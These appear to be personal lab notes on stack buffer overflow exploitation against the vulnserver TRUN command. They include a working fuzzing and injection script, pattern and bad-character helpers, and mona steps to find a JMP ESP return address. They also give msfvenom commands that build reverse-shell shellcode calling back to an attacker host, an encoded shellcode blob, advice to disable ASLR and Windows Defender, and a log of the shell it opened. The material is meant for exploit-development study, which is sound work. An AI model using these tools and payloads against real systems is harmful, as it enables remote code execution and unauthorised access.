# Buffer Overflow
# a.k.a. `BOF`
# just call them "Null-Terminated String" NTS attacks

# main questions to answer:
# 1) length of the buffer?
# 2) any bad characters?
# 3) a viable return address?
#
# some bytes are not going to work as overflow input
# ie. when str lib may handle them during validation.
# can test by sending all possible bytes 0x00-0xff, but
# common avoid bytes: 00 NUL, 10 LF, 0d, 25, 26, 2b, 3d
# shikata_ga_nai encoder rewrites msfvenom reverse shellcode to remove these
#
# its helpful if the binary can be copied & run locally to perfect overflow
# but it may be a situation where its installed dynamically and difficult to copy
# it'll be a lot harder if can't use debug, stealth, or restart if it crashes.
#
# windows
#   related tools: Immunity Debugger
#     has modules to search included dlls ie. for useful opcodes already in process mem
#   todo: develop minimalist shell code
#   can use JMP ESP cmd to exec from top of stack when overflow size is limited
# linux
#   related tools: Evans Debugger (edb)
#     has a plugin called Opcode Searcher ie. can find jmp instruction already in mem
#   todo: recreate my minimalist shell code


# check for ASLR (0=off)
cat /proc/sys/kernel/randomize_va_space
# Disable ASLR on linux machine
echo 0 > /proc/sys/kernel/randomize_va_space

# TODO: check for NX

# more on HOWTO Practice Buffer Overflow
# [1] https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/
# [2] https://www.vortex.id.au/2017/05/pwkoscp-stack-buffer-overflow-practice/
# I practiced by spinning up a Windows VM[1] and installing these recommended Buffer Overflow Practice apps[2]. You don’t need to do Savant, because it’s too advanced for BO. Focus on SLMAIL, FreeFloat and Minishare. I practiced for a good month understanding every step. Make sure you also download Brainpan from VulnHub because this machine teaches how to handle A LOT of bad characters – which is something that you will need to know for the exam. I broke down the BO into a 5-6 step process to help me remember and probably did it more than 30 times.

# guides:
# - https://www.youtube.com/playlist?list=PLLKT__MCUeix3O0DPbmuaRuR_4Hxo4m3G
# example target:
# - [vulnserver](http://thegreycorner.com/2010/12/15/introducing-vulnserver.html)
# tools:
# - [win10 vm](https://developer.microsoft.com/en-us/windows/downloads/virtual-machines/)
# - [immunity debugger](https://www.immunityinc.com/products/debugger/)

# We assume you have a fresh Win10 vm running with Immunity Debugger installed and the target binary running.
# NOTE: you may have to disable Real-Time Protection feature of WinDefend svc, to get target binary on disk.
# NOTE: you may need to run Immunity Debugger as Administrator to attach procs that aren't owned by your user.

# WARNING: Especially if Linux, ASLR (Address-Space Layout Randomization) likely needs to be disabled for this to work.

# identify required string length to overflow the stack, if possible.
# try 
#   for each user input
#     for a string length of 0...2048 // length is discretionary--may need to increase
#       submit string as user input
#       // check debugger for crash
# catch
#   print last length to fail for user input
#   // restart process AND debugger, or Immunity won't catch crash next round
```js
// injector.mjs
// $ node injector.mjs 172.16.67.130 9999 "TRUN /.:/" "\r\n" 100 1000
import { Socket } from 'net';
import { promisify } from 'util';
const [,,host='localhost',port=21,cmd_prefix='',ending="\r\n",inc=100,sleep=1000] = process.argv;
const main = async () => {
    const buf = [Buffer.from(cmd_prefix)]; // start of command
    console.log(`connecting to ${host}:${port} and sending ${cmd_prefix} ...`);
    while(true) {
        buf.push(Buffer.from(Array(parseInt(inc,10)).fill('A').join(''))); // filler of increasing-length
        const socket = new Socket();
        await promisify(socket.connect.bind(socket))(port, host);
        const input = Buffer.concat([...buf, Buffer.from(ending)]);
        process.stdout.write(`${input.length}...`);
        socket.write(input);
        await new Promise(ok=>setTimeout(ok,parseInt(sleep,10)));
        socket.end();
    }
};
main();
```

# NOTICE: it may be helpful to use a tool that sends random bytes and random lengths
# there is a tool called `spike` which does that, but idk seems lame.
# the idea is some inputs may not be possible unless they are properly formatted,
# but if you don't know the format, you'll have to brute force it.
# in the example, the TRUN command required a [secret?] prefix of /.:/
# that you could only have guessed this way....? assuming no documentation,
# disassembly, or wire sniffing would have yielded faster results....


# to identify what the injected stack looks like while the debugger is paused on a BOF exception,
# in Immunity Debugger: Right-click on EAX > Follow in Dump (Dump is bottom-left window)

# now repeat the above exercise, but using a unique pattern that can be used 
# like a measuring tape to find the exact buffer length.
# TODO: later, can combine above two operations for a 2-in-1 script.

```js
// pattern_create.js: a non-repeating pattern, like a UV colormap in shader debug.
// tweak value of `l=3000` to change length
// copy-paste into browser to put the result on your clipboard
var l=3000,o={},s='',g=(...a)=>{var n,x,b=i=>!i||i<n||i>x?n:i,i=a.length,d=1,t='',c;while(i>0){n=a[i-2];x=a[i-1];c=o[i]=b(o[i]);if(d)d=x===o[i]++;t=String.fromCharCode(c)+t;i-=2;}
return t};while(l-->0)s+=g(65,90,97,122,48,57);copy(s);s; // => Aa0Aa1Aa2Aa3Aa4Aa5A...
```

# once you spot your pattern written in memory,
# select the range of the pattern that appears in the area you are targeting
# (ie. the 32-bit EIP instruction pointer)
# and then paste it in `q` below to identify the offset from the beginning of the pattern.
# this is effectively part b, like reading our measuring tape above.

```js
// pattern_offset.js
// paste pattern_create.js output into `pattern` value.
// type discovered EIP hex value into `q` value.
// copy-paste into browser to put resulting offset on clipboard
// an offset of `-1` means not found.
var pattern = 'Aa0Aa1Aa2Aa3Aa4Aa5A...';
var q = '386F4337';
var ascii=q.match(/.{1,2}/g).reduce((a,c)=>a+String.fromCharCode(parseInt(c, 16)),'').split('').reverse().join('');
var offset=pattern.indexOf(ascii);copy(offset);offset; // => 2003
```

# now, we have enough information to begin injection but, to be thorough, we should also
# check for bytes the server may be dropping or normalizing before storing our user input.
# because a good app will do SOME validation of user input, despite invalid string length. ;D
# we do this by injecting a pattern of all possible bytes (0-255), and then verifying
# they are all present and orderly as seen in memory. if any are changed or missing,
# then we need to avoid the bytes which triggered that outcome.
# TODO: a param that lets us resize this into a multi-part pattern for small buffers could be useful

```js
// badchars.js: list \x00-\xFF
// copy-paste into browser to put the result on your clipboard
var i=0,s='';while(i<256)s+='\\x'+('0'+(i++).toString(16)).substr(-2);copy(s);s // => \x00\x01\x02\x03\x04...
```

# if we want to be extra thorough, we can re-run the first script to inject a series of A's followed by 4 B's
# to verify that the 4-byte/32-bit EIP register is effectively being overwritten with our return address
# perfectly aligned, as measured/intended.  ie. `"A"*2002 + "B"*4`
# reasons why it might not despite accurate measurements include proxychains and other environmental changes to user
# input that can happen in middleware stages between prototype and live.

# i believe from here could inject a nop sled and some shell code... or

# here we need a place to point the return pointer.
# we can weaponize existing code already loaded in the program address space
# by using mona to search for a specific instruction like `JMP ESP`
# which will jump to a pointer we can control with stack overflow.

# now its time to install mona.py if you haven't already.
# download from https://github.com/corelan/mona
# copy to "C:\Program Files (x86)\Immunity Inc\Immunity Debugger\PyCommands\"

# first we get the machine code bytes for the instruction we want to find
$ /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
nasm > JMP ESP
00000000 FFE4    jmp esp
# we copy `FFE4`


# in case we want to do the reverse
cd /workspace/tools/nasmshell
./nasmshell 
nasm> disas
disas mode
ndisasm> 50ff501c
50                       push eax
FF501C                   call [eax+0x1c]





# then in the Immunity Debugger console type:
!mona modules
# we are presented with a list of loaded modules and their memory protection settings
# ideally we want a lib with all `False`

# then we ask mona to search address space for those bytes in that lib (ie. `essfunc.dll`)
!mona find -s "\xff\xe4" -m essfunc.dll
!mona find -type instr -s "jmp ebx" -m essfunc.dll
# we can pick any found address in the list, and copy it... to use as our return addr
# again verify that each address still has memory protections listed as `False`
# (TODO: thinking it should, since its from same lib, and those are per-lib settings)
# we copy the address `625011AF` (double-click to clear popup)
# now there is a black right-arrow ->: icon on the debugger toolbar we can use to "Enter expression to follow";
# click it and type in the return address, and then in the top-left window pane, set a breakpoint at that address
# NOTE: F2 is hotkey to set breakpoint in Immunity Debugger

# now we can update our injection script to replace the 4*"B" bytes with our return address
# NOTICE: we have to reverse the address given by mona so its little-endian. (ie `0xDEADBEEF` becomes `0xEFBEADDE`)

# re-run our injection, and we should hit our breakpoint in the debugger!
# now we are finally ready to build our shellcode.


$ msfvenom -a x86 -p windows/shell_reverse_tcp LHOST=192.168.20.131 LPORT=4444 EXITFUNC=thread -f base64 -b "\x00"
# `-b "\x00"` this is our list of "bad bytes" to avoid
# `EXITFUNC=thread` means it will attempt to exit the shellcode gracefully as not to crash the parent process

# NOTICE: verify the payload size is not exceeding your buffer size, or it will need to be shorter.

```python
nopsled = "\x90"*32 # padding is fungible
shellcode = "A"*2003 + "\xEF\xBE\xAD\xDE" + nopsled + shellcode
```


# ---
# APPLYING WHAT I'VE LEARNED
#
# I made a custom script to automate most of this
$ cd /workspace/bof/

# find port
$ nmap -sS -Pn -v --open -p0-60000 172.16.67.130 -T5

# verify correct svc
$ nc -vn 172.16.67.130 9999

# debug new script locally
while true; do nc -vnlp 9999 -s 127.0.0.1 | xxd; done;
$ node injector.mjs --help
# see if app will crash
$ node injector.mjs --host 127.0.0.1 --port 9999 --pre "TRUN /.:/" --inc 1 --sleep 1000 --count 3
# measure size of buffer
$ node injector.mjs --host 127.0.0.1 --port 9999 --pre "TRUN /.:/" --inc 1 --sleep 1000 --strat a
# generate AAA...BBBB test in size of buffer to verify EIP target is correct
$ node injector.mjs --host 127.0.0.1 --port 9999 --pre "TRUN /.:/" --inc 1 --sleep 1000 --strat bad
# generate bad bytes in size of buffer to ascertain validation
$ node injector.mjs --host 127.0.0.1 --port 9999 --pre "TRUN /.:/" --sleep 5000 --strat bad --calc 386F4337 --filter "\x00"
# alterantive stdout mode for injecting into non-telnet inputs
$ node injector.mjs --host 127.0.0.1 --port 9999 --pre "TRUN /.:/" --sleep 1000 --strat ab --calc 386F4337 --stdout 2>/dev/null
# generate ret
$ node injector.mjs --host 127.0.0.1 --port 9999 --pre "TRUN /.:/" --count 1 --strat ab --calc 386F4337 --ret 625011AF

# example session/progression with vulnserver.exe
# use custom script against target (minimum steps)
# confirm it overflows
$ node injector.mjs --host 172.16.67.130 --port 9999 --pre "TRUN /.:/" --count 1 --strat pattern --inc 10000
# (optional) verify the return address becomes EIP (BBBB)
$ node injector.mjs --host 172.16.67.130 --port 9999 --pre "TRUN /.:/" --count 1 --strat ab --calc 386F4337
# (recommended) verify whether any bytes are bad
$ node injector.mjs --host 172.16.67.130 --port 9999 --pre "TRUN /.:/" --count 1 --strat bad --filter "\x00" --inc 10000
# exploit the target with shellcode while on breakpoint
idb> !mona modules
idb> !mona find -s "\xff\xe4" -m essfunc.dll
# we copy `625011AF`
# we restart immunity
# we use the evaluate button to jump to this addr (->: icon)
# we set breakpoint at that addr (F2)
# (optional) verify program jumps to our breakpoint
$ node injector.mjs --host 172.16.67.130 --port 9999 --pre "TRUN /.:/" --count 1 --strat ab --calc 386F4337 --ret 625011AF
# generate + inject shellcode (8 nop bytes was lower end required, but 32 is safer if you have room)
$ msfvenom -p windows/shell_reverse_tcp LHOST=172.16.67.128 LPORT=443 EXITFUNC=thread -f c -b "\x00"
$ export SHELLCODE=3ca+cHTtqdl0JPRfK8mxUjF3F4Pv/AMHZw9cG29Nn+NwMikGQXJNQ/JCBQH/KUuxdF9Etj3qsvm+R4aYPJrbenxVLnu5iMMpEsZ23ReSSlZrMsuLPDX6GjZs3J2bBFWF+CEvPsrerpYCHhzXqu1cEAwOK2husyyvDG+4K7bkGpdGKPxcRIWKOkkYXjF1kWGV/+FFMVux5GABFBhy6sm8+QcdzaBP0vxakHx2KaIjLKWOrOoy8IZLrA8prOXLffyd+v2XXQIoNw2sg/j9DHSRF4OrgRhJxCjjGke8qFr/vy5au0nINqsfQ69SOh9OmpBaUBAXmx/RUo/IESntXy2HmTy8TFlK3doOGxMT2rEKjfhLyva4ly/4QVUL3lGjlFoFe8M08z299q2XElE5YVliP260FN/fYWHg0OVlmQyWinCVtmhQ4F41MUkDxuyOOkUEb7lVbWqF0Z4GlregtZed
$ node injector.mjs --host 172.16.67.130 --port 9999 --pre "TRUN /.:/" --count 1 --strat shellcode --calc 386F4337 --ret 625011AF --nopsled 32 --shellcode $SHELLCODE

[*] new session   0 172.16.67.128:443 <- 172.16.67.130:53309 at 2021-10-17T05:56:47.941Z
session 0
selected session 0
Microsoft Windows [Version 10.0.19043.1288]
(c) Microsoft Corporation. All rights reserved.

C:\Users\User\AppData\Local\Temp\x>
whoami
whoami

windev2108eval\user









# Dispelling some bullshit on YouTube

# This illustration is very incorrect. ESP, EBP, EIP live on-CPU next to L2-cache, they are not anywhere near buffer space in RAM memory. The stack and the general purpose registers are not next to each other in physical or logical space. They are separate devices. It might be more accurate if you labeled the General Purpose Registers off to one side and then drew arrows to the buffer space, representing the pointers that they are--from one physical device to another. Likewise there is no scenario where you can overflow the registers. It is not possible to write to the A register in a way that will overflow into B, C, D, etc. 
# 
# Buffer Overflows can only happen in RAM memory, and only because of C language programming conventions... primarily whomever thought it was a great idea to make a NUL 0x0 byte terminate a string rather than more modern alternatives such as prefixing the string with its length.
# 
# So the overflow that is happening requires a few conditions: a) the user input data type is stored as a string buffer in memory, and b) as a stack variable. That's because what you're overwriting is the stack. The calling convention on both Windows and Linux (again, inspired by early ideas in the C language) is that whenever you invoke a function, it pushes several things onto the stack (recall that the stack grows towards 0x00): the function arguments in reverse order (..., 3rd, 2nd, 1st), the pointer for return address where the program should JMP once its done with the function (this is our target), a frame pointer, and then our local variables (1st, 2nd, 3rd...) which is where the user input variable must live in over for overflow to work.
# 
# The way that this results in corruption of the General Purpose Registers is through normal program operation, as the CPU is instructed to read that return address for its JMP instruction from the stack once the function has ended, it is poisoned with a value that the user wrote via buffer overflow. Both EIP and EBP are tainted in the same way. They read from the stack during normal operation.


# ...
# The real question of our time is who is to blame for the idea of null terminated strings? What is the total cost of such a design choice, 40 years later? Why do we continue to use it? :D 